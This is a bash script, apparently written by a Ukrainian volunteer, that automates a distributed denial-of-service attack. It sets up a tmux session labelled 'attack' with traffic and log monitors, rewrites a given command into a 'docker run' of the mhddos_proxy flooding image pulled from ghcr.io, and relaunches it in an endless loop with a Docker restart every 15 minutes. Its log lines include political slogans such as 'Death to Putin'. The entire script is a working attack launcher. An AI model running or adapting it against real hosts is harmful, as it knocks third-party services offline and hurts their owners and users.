clear
tmux new-session -s attack -d
tmux split-window -t attack -h -p 50
tmux split-window -t attack -v -p 66
tmux split-window -t attack -v -p 50
tmux select-window -t attack
tmux send-keys -t 1 C-z 'htop' Enter
tmux send-keys -t 2 C-z 'nload eth0' Enter
tmux send-keys -t 3 C-z 'tail -f /var/log/attack.log' Enter
logfile="/var/log/attack.log"
command=$1
parameter=$2
echo "$(date "+%d.%m.%Y %H:%M:%S")" "--== Починаю процедуру атаки=--" >> $logfile
echo "                    Слава Україні! Героям слава! Смерть путіну!" >> $logfile
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Надана команда:" "$1" >> $logfile
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Наданий параметр:" "$2" >> $logfile
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Виконую переналаштування для автоматизації виконання" >> $logfile
command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$2" -p 1200 --rpc 1000 --table"
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Остаточна команда: " "$command" >> $logfile
while true 
do
tmux select-window -t attack
tmux select-pane -t 0
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Починаю роботу докер-контейнеру" >> /var/log/attack.log & tmux send-keys -t 0 C-z "$command" Enter & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер запустився" >> /var/log/attack.log & sleep 15m && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер попрацював 15 хвилин, перезапускаю, шоб не висло" >> /var/log/attack.log && systemctl restart docker
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер перезапущено, чекаю 5 секунд до перезапуску циклу, шоб встиг" >> /var/log/resting.log
sleep 5
done